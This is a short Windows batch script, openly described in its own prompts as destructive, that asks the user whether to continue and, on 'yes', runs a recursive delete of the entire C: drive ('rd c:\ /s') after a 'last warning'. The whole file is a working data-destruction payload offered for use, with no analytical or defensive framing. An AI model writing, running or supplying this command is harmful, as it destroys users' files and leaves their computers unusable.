@echo off
:1
color a
echo What have you just executed will damage your files. Make sure you're using safe environment before executing this script. Do you want to continue running this script resulting in an unusable computer? (answer in only yes/no)
set /p input=
if /i %input%==yes goto delete
if /i %input%==no goto save
if /i not %input%== yes,no goto 1

:delete
echo Last warning! If you click on y and enter, your computer will be cooked
rd c:\ /s
pause
exit
:save
pause
exit
